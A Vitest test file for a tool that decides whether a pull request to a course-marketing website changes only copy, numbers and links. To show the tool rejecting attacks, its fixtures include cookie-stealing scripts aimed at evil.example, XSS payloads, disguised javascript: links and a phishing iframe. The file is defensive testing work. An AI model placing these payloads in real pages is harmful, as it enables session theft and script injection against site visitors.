import { describe, expect, it, vi } from 'vitest';
import {
  CONTENT_ONLY_MAX_FILES,
  checkContentOnlyPr,
  differsOnlyInContent,
  globToRegExp,
  isActiveUrl,
  isContentPath,
  isNotePath,
  looksLikeCode,
} from '../src/github/contentOnlyDiff.js';
import { REPO_REGISTRY } from '../src/repos/registry.js';

// Issue #701: a PR that only changes copy, numbers and asset links may be
// merged by builders without the usual review. "Only" is read from the
// files: the old and new versions must be the same program once content
// literals are masked, and no changed value may read like code or markup.

const policy = REPO_REGISTRY['newton-marketing-web'].contentPolicy!;

const HERO = `'use client';
import Image from 'next/image';
import { track } from '@/lib/analytics';

/** The page's first screen. */
export function Hero({ arm }: { arm: string }) {
  if (arm === 'no_form') return null;
  return (
    <section className="p-4" data-section="hero">
      <h1 title="AI Engineering">Become an AI engineer</h1>
      <p>{'Fees from'} {formatFee(150000)}</p>
      <Image src="https://cdn.example.com/hero.png" alt="Students coding" width={640} height={360} />
      <a href="/apply" onClick={() => track('apply_click')}>Apply now</a>
      <Banner heading="Admissions open" ctaText="Apply" delayMs={5000} />
    </section>
  );
}
`;

/** Shaped like the repo's real content files. */
const CONTENT = `/** Shared footer / contact. */
export const FOOTER = {
  phone: '+91 - 8792019038',
  phoneHref: 'tel:+91-8792019038',
} as const;

export const ADMISSION = {
  emiValue: '₹ 5,000',
  emiTotal: 'Total ₹ 1.3L* (inclusive of taxes)',
  fee: 150000,
  delta: -1,
  images: { hero: 'https://cdn.example.com/hero.png' },
  highlights: ['Live classes', 'Placement support'],
  dates: '12 Jan – 15 Feb 2027',
  formId: 'rcb-1',
};

export const DEADLINE = '2027-01-15';
`;

async function same(before: string, after: string, fileName = 'hero.tsx') {
  return differsOnlyInContent(before, after, fileName);
}

describe('differsOnlyInContent: copy edits', () => {
  it.each([
    ['page text', HERO.replace('Become an AI engineer', 'Become a GenAI engineer')],
    ['a copy attribute', HERO.replace('alt="Students coding"', 'alt="Learners coding"')],
    ['a string child expression', HERO.replace("{'Fees from'}", "{'Fee starts at'}")],
    ['an image link', HERO.replace('hero.png', 'hero-v2.png')],
    ['a link target', HERO.replace('href="/apply"', 'href="/apply-now"')],
    ['a copy prop of a component', HERO.replace('heading="Admissions open"', 'heading="Admissions close soon"')],
    ['a prop named as copy', HERO.replace('ctaText="Apply"', 'ctaText="Apply today"')],
    [
      'comments and formatting',
      HERO.replace("/** The page's first screen. */", '// first screen\n// (hero)').replace(
        '  return (',
        '  return  (',
      ),
    ],
  ])('counts a change of %s as content', async (_case, after) => {
    expect(await same(HERO, after)).toBe(true);
  });

  it.each([
    ['a phone number and its link (marketing #1484)', CONTENT.replace(/8792019038/g, '6366275707')],
    ['a fee in words (marketing #1483)', CONTENT.replace('₹ 1.3L*', '₹ 1.5L*')],
    ['a number in a data object', CONTENT.replace('150000', '175000')],
    ['a negative number', CONTENT.replace('delta: -1', 'delta: -2')],
    ['an amount in rupees', CONTENT.replace('₹ 5,000', '₹ 6,500')],
    ['dates with an en dash', CONTENT.replace('12 Jan – 15 Feb 2027', '19 Jan – 22 Feb 2027')],
    [
      'an asset link in an object',
      CONTENT.replace("hero: 'https://cdn.example.com/hero.png'", "hero: 'https://cdn.example.com/hero-2.png'"),
    ],
    ['an array element', CONTENT.replace('Live classes', 'Live classes, weekly')],
    [
      'a list breaking over lines',
      CONTENT.replace("['Live classes', 'Placement support']", "[\n    'Live classes',\n    'Placement support',\n  ]"),
    ],
  ])('counts a change of %s as content', async (_case, after) => {
    expect(await same(CONTENT, after, 'content.ts')).toBe(true);
  });

  it('ignores what a formatter adds when longer text no longer fits', async () => {
    const before = `export const A = () => <p>Short text <b>here</b></p>;\n`;
    const after = `export const A = () => (\n  <p>\n    A much longer text that wraps{' '}\n    <b>here</b>\n  </p>\n);\n`;
    expect(await same(before, after)).toBe(true);
  });
});

describe('differsOnlyInContent: changes of behaviour', () => {
  it.each([
    ['a class name', HERO.replace('className="p-4"', 'className="p-8"')],
    ['a data attribute', HERO.replace('data-section="hero"', 'data-section="top"')],
    ['a compared string', HERO.replace("arm === 'no_form'", "arm === 'with_form'")],
    ['a call argument', HERO.replace("track('apply_click')", "track('apply_tap')")],
    ['a call wrapping a number', HERO.replace('formatFee(150000)', 'formatFee(175000)')],
    ['an image size, which is layout', HERO.replace('width={640}', 'width={720}')],
    ['a behaviour prop of a component', HERO.replace('delayMs={5000}', 'delayMs={0}')],
    [
      'an added import',
      HERO.replace("import Image from 'next/image';", "import Image from 'next/image';\nimport Link from 'next/link';"),
    ],
    [
      'an added statement',
      HERO.replace(
        "  if (arm === 'no_form') return null;",
        "  if (arm === 'no_form') return null;\n  console.log(arm);",
      ),
    ],
    [
      'added markup',
      HERO.replace(
        '<h1 title="AI Engineering">Become an AI engineer</h1>',
        '<h1 title="AI Engineering">Become an <b>AI</b> engineer</h1>',
      ),
    ],
    ['text that becomes a template', HERO.replace("{'Fees from'}", '{`Fees from ${city}`}')],
  ])('does not count a change of %s as content', async (_case, after) => {
    expect(await same(HERO, after)).toBe(false);
  });

  it.each([
    ['an id-like key', CONTENT.replace("'rcb-1'", "'rcb-2'")],
    ['a number turned into text', CONTENT.replace('fee: 150000', "fee: '₹1.5L'")],
    ['a reference in place of a literal', CONTENT.replace("'2027-01-15'", 'NEXT_DEADLINE')],
    ["a constant's whole value", CONTENT.replace("'2027-01-15'", "'2027-01-20'")],
  ])('does not count a change of %s as content', async (_case, after) => {
    expect(await same(CONTENT, after, 'content.ts')).toBe(false);
  });

  // The review of PR #704 found each of these passing as content.
  it.each([
    [
      'an inline script held in a template constant',
      "export const GATE_SCRIPT = `(function(){var a='${ATTR}';d.setAttribute(a,'on')})()`;",
      "export const GATE_SCRIPT = `(function(){var a='${ATTR}';fetch('https://evil.example/'+document.cookie)})()`;",
    ],
    [
      'an inline script held in a string constant',
      'const UNGATE_SCRIPT = \'(function(){w.removeAttribute("inert")})()\';',
      'const UNGATE_SCRIPT = \'(function(){new Image().src="https://evil.example/?"+document.cookie})()\';',
    ],
    [
      'a popup delay',
      'const POPUP_DELAY_MS = 50000; export function P(){ useEffect(()=>{ const t=setTimeout(open, POPUP_DELAY_MS); return ()=>clearTimeout(t); },[]); return null; }',
      'const POPUP_DELAY_MS = 0; export function P(){ useEffect(()=>{ const t=setTimeout(open, POPUP_DELAY_MS); return ()=>clearTimeout(t); },[]); return null; }',
    ],
    [
      'a time-zone offset and cut-off',
      "const IST_OFFSET_MS = 19_800_000; export const CUTOFF_HOUR_IST = 22; export const NUDGE_FORCE_PARAM = 'ds_nudge';",
      "const IST_OFFSET_MS = 0; export const CUTOFF_HOUR_IST = 24; export const NUDGE_FORCE_PARAM = 'x';",
    ],
    [
      'Next.js segment config',
      "export const dynamic = 'force-static'; export const revalidate = 3600; export const runtime = 'nodejs';",
      "export const dynamic = 'force-dynamic'; export const revalidate = 1; export const runtime = 'edge';",
    ],
    [
      'a returned experiment arm',
      "export function getVariant(){ return 'control'; }",
      "export function getVariant(){ return 'treatment'; }",
    ],
    [
      'a returned class string',
      "export function tone(on: boolean){ return on ? 'bg-green-600' : 'bg-gray-200'; }",
      "export function tone(on: boolean){ return on ? 'bg-red-600' : 'bg-gray-200'; }",
    ],
    [
      'an arrow returning a URL',
      "export const getBase = () => 'https://api.prod';",
      "export const getBase = () => 'https://evil';",
    ],
    [
      'an API URL fed to fetch',
      "const LEAD_URL = 'https://api.newtonschool.co/lead'; export const send = (b) => fetch(LEAD_URL, {method:'POST', body:b});",
      "const LEAD_URL = 'https://evil.example/lead'; export const send = (b) => fetch(LEAD_URL, {method:'POST', body:b});",
    ],
    [
      'an endpoints map',
      "export const ENDPOINTS = { submit: 'https://a' };",
      "export const ENDPOINTS = { submit: 'https://evil' };",
    ],
    [
      'a storage key',
      "const SEEN = 'popup_seen'; export const seen = () => localStorage.getItem(SEEN);",
      "const SEEN = 'popup_seen_v2'; export const seen = () => localStorage.getItem(SEEN);",
    ],
    [
      'an experiment split',
      'export const HERO_TEST = { split: 0.5, enabled: 1 };',
      'export const HERO_TEST = { split: 1, enabled: 0 };',
    ],
    [
      'robots metadata',
      "export const metadata = { robots: 'index, follow' };",
      "export const metadata = { robots: 'noindex, nofollow' };",
    ],
    [
      'class strings in a styles map',
      "export const styles = { card: 'p-4 bg-white' };",
      "export const styles = { card: 'p-4 bg-black' };",
    ],
  ])('does not count %s as content', async (_case, before, after) => {
    expect(await same(before, after, 'a.tsx')).toBe(false);
  });

  it.each([
    [
      'markup in a data object that ends up in JSON-LD',
      "export const schema = { description: 'Learn AI' };",
      "export const schema = { description: '</script><script>alert(1)</script>' };",
    ],
    [
      'raw HTML in a data object',
      "export const blurb = { text: '<b>Top</b> results' };",
      "export const blurb = { text: '<img src=x onerror=alert(1)>' };",
    ],
    [
      'code in a data object',
      "export const copy = { label: 'Apply now' };",
      "export const copy = { label: 'x;fetch(1)' };",
    ],
  ])('turns down %s even with no raw HTML in the file', async (_case, before, after) => {
    expect(await same(before, after, 'content.ts')).toBe(false);
  });

  it.each([
    [
      'JSON-LD rendered with dangerouslySetInnerHTML',
      'const schema = { description: \'Learn AI\' }; export const S = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }} />;',
      'const schema = { description: \'Learn AI today\' }; export const S = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }} />;',
    ],
    [
      'an object value that feeds an iframe',
      "const callback = { label: 'Call', link: 'https://forms.newton/x' }; export const N = () => <iframe src={callback.link} />;",
      "const callback = { label: 'Call', link: 'https://evil.example/phish' }; export const N = () => <iframe src={callback.link} />;",
    ],
  ])('turns down any change in a file with %s', async (_case, before, after) => {
    expect(await same(before, after)).toBe(false);
  });

  it.each([
    ['an HTML-entity spelling', 'export const A = () => <a href="&#106;avascript:alert(document.cookie)">Apply</a>;'],
    ['a template', 'export const A = ({q}) => <a href={`javascript:alert(1)//${q}`}>Apply</a>;'],
    ['a tab inside the scheme', "export const A = () => <a href={'java\\tscript:alert(1)'}>Apply</a>;"],
    ['a data: link', 'export const A = () => <a href="data:text/html,hi">Apply</a>;'],
  ])('turns down a link that runs code, written as %s', async (_case, after) => {
    const before = after.includes('${q}')
      ? 'export const A = ({q}) => <a href={`/apply?x=${q}`}>Apply</a>;'
      : "export const A = () => <a href={'/apply'}>Apply</a>;";
    const plainBefore = before.replace("{'/apply'}", '"/apply"');
    expect(await same(before, after)).toBe(false);
    expect(await same(plainBefore, after)).toBe(false);
  });

  it('treats the body of a <script> or <style> as code', async () => {
    const before = `export const A = () => <><style>{'.a { color: red }'}</style><p>Hi</p></>;\n`;
    expect(await same(before, before.replace('red', 'blue'))).toBe(false);
  });

  it('only counts <meta> content that describes the page', async () => {
    const meta = (name: string, content: string) =>
      `export const M = () => <meta name="${name}" content="${content}" />;`;
    expect(await same(meta('description', 'Learn AI'), meta('description', 'Learn GenAI'))).toBe(true);
    expect(await same(meta('robots', 'index'), meta('robots', 'noindex'))).toBe(false);
    const refresh = (url: string) => `export const M = () => <meta httpEquiv="refresh" content="0;url=${url}" />;`;
    expect(await same(refresh('/a'), refresh('/b'))).toBe(false);
  });

  it('is undefined when a version does not parse', async () => {
    expect(await same(HERO, HERO.replace('</section>', '</sectio'))).toBeUndefined();
  });
});

describe('looksLikeCode and isActiveUrl', () => {
  it.each([
    'Total ₹ 1.5L* (inclusive of taxes)',
    '+91 - 6366275707',
    'tel:+91-6366275707',
    '93% placed',
    '12 Jan – 15 Feb 2027',
    'Fees&nbsp;₹1.5L',
    'Learn how a function works',
  ])('reads %j as copy', text => {
    expect(looksLikeCode(text)).toBe(false);
  });

  it.each([
    '</script><script>',
    '<b>bold</b>',
    'a{b}',
    'x;y',
    '() => 1',
    'document.cookie',
    'fetch(url)',
    'function (){}',
  ])('reads %j as code', text => {
    expect(looksLikeCode(text)).toBe(true);
  });

  it.each([
    'javascript:alert(1)',
    ' JaVaScRiPt:x',
    '&#106;avascript:x',
    '&#x6A;avascript:x',
    'java\tscript:x',
    'java&Tab;script:x',
    'data:text/html,x',
    'vbscript:x',
  ])('spots %j as a link that runs code', text => {
    expect(isActiveUrl(text.replace('&Tab;', '&tab;'))).toBe(true);
  });

  it('lets ordinary links through', () => {
    expect(isActiveUrl('https://www.newtonschool.co/apply')).toBe(false);
    expect(isActiveUrl('/apply')).toBe(false);
    expect(isActiveUrl('tel:+91-6366275707')).toBe(false);
  });
});

describe('isContentPath', () => {
  it.each([
    ['src/features/agentic-ai-course/content.ts', true],
    ['src/features/data-science-ns-v4/sections/hero.tsx', true],
    ['src/features/nst-entrance/content/coding-nsat.ts', true],
    ['src/features/ai-masterclass/content/generative-ai-for-business-leaders.ts', true],
    ['src/features/data-science-v2/sections/use-of-ds.tsx', true],
    ['src/app/(landing)/courses/data-science/page.tsx', true],
    ['src/components/ui/card.tsx', true],
    ['src/lib/experiments/registry.ts', false],
    ['worker/paths.js', false],
    ['.github/workflows/deploy-prod.yml', false],
    ['src/app/layout.tsx', false],
    ['src/app/(landing)/layout.tsx', false],
    ['src/app/api/lead/route.ts', false],
    ['src/app/robots.ts', false],
    ['src/app/sitemap.ts', false],
    ['src/middleware.ts', false],
    ['src/features/data-science-ns-v4/forms/rcb-modal.tsx', false],
    ['src/features/agentic-ai-course/analytics.ts', false],
    ['src/features/data-science-ns-v4/experiment.ts', false],
    ['src/features/x/ab-test.ts', false],
    ['src/features/x/tracking.ts', false],
    ['src/features/koyo-ai-interviewer/tracking/device-id.ts', false],
    ['src/features/about-us/page-view-tracker.tsx', false],
    ['src/features/hire-from-us-version-3/ui/tracked-link.tsx', false],
    ['src/features/hire-from-us-version-3/auth/session-api.ts', false],
    ['src/features/hire-from-us-version-3/auth/session.ts', false],
    ['src/features/candidate-profiles-hire-from-us-v3/gate/gate-boot.tsx', false],
    ['src/features/data-science-ns-v5/ui/highlights-motion-gate.tsx', false],
    ['src/features/ds-shared/seat-nudge.ts', false],
    ['src/features/x/hooks/use-popup.ts', false],
    ['src/features/data-science-ns-v7/forms/use-instant-callback.ts', false],
    ['src/features/nst-apply/ui/logged-in-context.tsx', false],
    ['src/features/homepage/forms/home-modals-provider.tsx', false],
    ['src/features/agentic-ai-course/forms/apply-config.ts', false],
    ['src/features/agentic-generalist-program/config.ts', false],
    ['src/features/x/inline-script.ts', false],
    ['src/features/x/seatNudgeScript.ts', false],
    ['src/features/x/sections/hero.test.tsx', false],
    ['src/features/x/content.json', false],
    ['src/features/x/types.d.ts', false],
    ['package.json', false],
  ])('%s → %s', (filePath, expected) => {
    expect(isContentPath(filePath, policy)).toBe(expected);
  });

  // A feature's own notes never ship to the site; 8 of 29 recent miniOG copy
  // PRs touched one alongside the copy.
  it.each([
    ['src/features/nst-home/CLAUDE.md', true],
    ['src/features/nst-apply/_design/REHOST-CAMPUS-AMENITIES.md', true],
    ['src/features/x/README.md', true],
    ['CLAUDE.md', false],
    ['AGENTS.md', false],
    ['src/app/(landing)/newton-school-of-technology-nst/placement/CLAUDE.md', false],
    ['src/components/README.md', false],
    ['.claude/skills/parity-audit/SKILL.md', false],
    ['src/features/x/notes.mdx', false],
    ['src/features/x/ledger.json', false],
  ])('counts %s as a note: %s', (filePath, expected) => {
    expect(isNotePath(filePath, policy)).toBe(expected);
  });

  it('reads ** as any number of folders, none included', () => {
    expect(globToRegExp('**/forms/**').test('forms/a.tsx')).toBe(true);
    expect(globToRegExp('**/forms/**').test('src/x/forms/a.tsx')).toBe(true);
    expect(globToRegExp('src/*.ts').test('src/a/b.ts')).toBe(false);
  });
});

describe('checkContentOnlyPr', () => {
  const api = 'https://api.github.com/repos/Newton-School/newton-marketing-web';
  const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status });

  /** GitHub as a map from URL to answer; anything else is a 404. */
  function github(routes: Record<string, () => Response>) {
    return vi.fn(async (url: string) => (routes[url] ?? (() => new Response('not found', { status: 404 })))());
  }
  const pr =
    (base = 'main', defaultBranch = 'main') =>
    () =>
      json({ state: 'open', head: { sha: 'HEAD' }, base: { ref: base, repo: { default_branch: defaultBranch } } });
  const compare =
    (...entries: Array<[string, string]>) =>
    () =>
      json({ merge_base_commit: { sha: 'MB' }, files: entries.map(([filename, status]) => ({ filename, status })) });
  const raw = (text: string) => () => new Response(text);
  const check = (fetcher: ReturnType<typeof github>, signal?: AbortSignal) =>
    checkContentOnlyPr({
      owner: 'Newton-School',
      repo: 'newton-marketing-web',
      number: 1490,
      githubToken: 'ghs_test',
      policy,
      fetcher,
      signal,
    });
  const PATH = 'src/features/agentic-ai-course/content.ts';
  const copyEdit = () => ({
    [`${api}/pulls/1490`]: pr(),
    [`${api}/compare/main...HEAD`]: compare([PATH, 'modified']),
    [`${api}/contents/${PATH}?ref=MB`]: raw(CONTENT),
    [`${api}/contents/${PATH}?ref=HEAD`]: raw(CONTENT.replace('150000', '175000')),
  });

  it('passes a copy edit, comparing the head with where it left the base branch', async () => {
    const fetcher = github(copyEdit());

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [PATH], headSha: 'HEAD' });
    const headers = (fetcher.mock.calls[0] as unknown as [string, RequestInit])[1].headers as Record<string, string>;
    expect(headers.Authorization).toBe('Bearer ghs_test');
  });

  it('names the file that changes code', async () => {
    const path = 'src/features/x/sections/hero.tsx';
    const fetcher = github({
      [`${api}/pulls/1490`]: pr(),
      [`${api}/compare/main...HEAD`]: compare([path, 'modified']),
      [`${api}/contents/${path}?ref=MB`]: raw(HERO),
      [`${api}/contents/${path}?ref=HEAD`]: raw(HERO.replace('className="p-4"', 'className="p-8"')),
    });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [path] });
  });

  it('turns down a PR into a branch other than the default one, without reading the diff', async () => {
    const fetcher = github({ [`${api}/pulls/1490`]: pr('release') });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_default_base' });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['an added file', ['src/features/x/content.ts', 'added']],
    ['a renamed file', ['src/features/x/content.ts', 'renamed']],
    ['a removed file', ['src/features/x/content.ts', 'removed']],
    ['a worker file', ['worker/paths.js', 'modified']],
    ['a denied path', ['src/lib/experiments/registry.ts', 'modified']],
  ] as Array<[string, [string, string]]>)('turns down %s without reading it', async (_case, entry) => {
    const fetcher = github({ [`${api}/pulls/1490`]: pr(), [`${api}/compare/main...HEAD`]: compare(entry) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [entry[0]] });
    expect(fetcher.mock.calls.some(call => String(call[0]).includes('/contents/'))).toBe(false);
  });

  it.each([
    [CONTENT_ONLY_MAX_FILES + 1, 'It changes 21 files.'],
    [300, 'It changes 300 or more files.'],
  ])('turns down %i files', async (count, reason) => {
    const many = Array.from(
      { length: count },
      (_, i) => [`src/features/x/content-${i}.ts`, 'modified'] as [string, string],
    );
    const fetcher = github({ [`${api}/pulls/1490`]: pr(), [`${api}/compare/main...HEAD`]: compare(...many) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'too_many_files', reason });
  });

  it.each([
    ['the PR cannot be read', {}],
    [
      'the PR is closed',
      {
        [`${api}/pulls/1490`]: () =>
          json({ state: 'closed', head: { sha: 'H' }, base: { ref: 'main', repo: { default_branch: 'main' } } }),
      },
    ],
    ['the comparison cannot be read', { [`${api}/pulls/1490`]: pr() }],
    [
      'a file cannot be read',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
      },
    ],
    [
      'a file is too large',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
        [`${api}/contents/src/features/x/content.ts?ref=MB`]: raw(`export const a = { t: '${'x'.repeat(250_000)}' };`),
        [`${api}/contents/src/features/x/content.ts?ref=HEAD`]: raw(CONTENT),
      },
    ],
    [
      'a file does not parse',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
        [`${api}/contents/src/features/x/content.ts?ref=MB`]: raw(CONTENT),
        [`${api}/contents/src/features/x/content.ts?ref=HEAD`]: raw('export const = {'),
      },
    ],
  ] as Array<[string, Record<string, () => Response>]>)('is not content-only when %s', async (_case, routes) => {
    expect(await check(github(routes))).toMatchObject({ contentOnly: false, kind: 'unreadable' });
  });

  it('never throws, even when the network does', async () => {
    const fetcher = vi.fn().mockRejectedValue(new Error('ECONNRESET'));
    expect(await check(fetcher as never)).toMatchObject({ contentOnly: false, kind: 'unreadable' });
  });

  it('reads nothing more once the run is cancelled', async () => {
    const controller = new AbortController();
    const routes = copyEdit();
    const fetcher = github({
      ...routes,
      [`${api}/pulls/1490`]: () => {
        controller.abort();
        return routes[`${api}/pulls/1490`]();
      },
    });

    expect(await check(fetcher, controller.signal)).toMatchObject({
      contentOnly: false,
      kind: 'unreadable',
      reason: 'The run was cancelled.',
    });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });

  it("passes a copy edit with the feature's notes, without reading the notes", async () => {
    const note = 'src/features/agentic-ai-course/CLAUDE.md';
    const routes = copyEdit();
    const fetcher = github({
      ...routes,
      [`${api}/compare/main...HEAD`]: compare([PATH, 'modified'], [note, 'modified']),
    });

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [PATH, note], headSha: 'HEAD' });
    expect(fetcher.mock.calls.some(call => String(call[0]).includes('CLAUDE.md'))).toBe(false);
  });

  it.each([
    ['an added note', ['src/features/x/CLAUDE.md', 'added']],
    ['a removed note', ['src/features/x/README.md', 'removed']],
    ['a renamed note', ['src/features/x/README.md', 'renamed']],
    ['the root CLAUDE.md', ['CLAUDE.md', 'modified']],
    ['the root AGENTS.md', ['AGENTS.md', 'modified']],
    ['a note outside features', ['src/app/(landing)/x/CLAUDE.md', 'modified']],
  ] as Array<[string, [string, string]]>)('turns down a copy edit with %s', async (_case, entry) => {
    const fetcher = github({ ...copyEdit(), [`${api}/compare/main...HEAD`]: compare([PATH, 'modified'], entry) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [entry[0]] });
  });

  it('encodes route folders in a file path', async () => {
    const path = 'src/app/(landing)/courses/ai/page.tsx';
    const encoded = path.split('/').map(encodeURIComponent).join('/');
    const fetcher = github({
      [`${api}/pulls/1490`]: pr(),
      [`${api}/compare/main...HEAD`]: compare([path, 'modified']),
      [`${api}/contents/${encoded}?ref=MB`]: raw(HERO),
      [`${api}/contents/${encoded}?ref=HEAD`]: raw(HERO.replace('Apply now', 'Apply today')),
    });

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [path], headSha: 'HEAD' });
  });
});
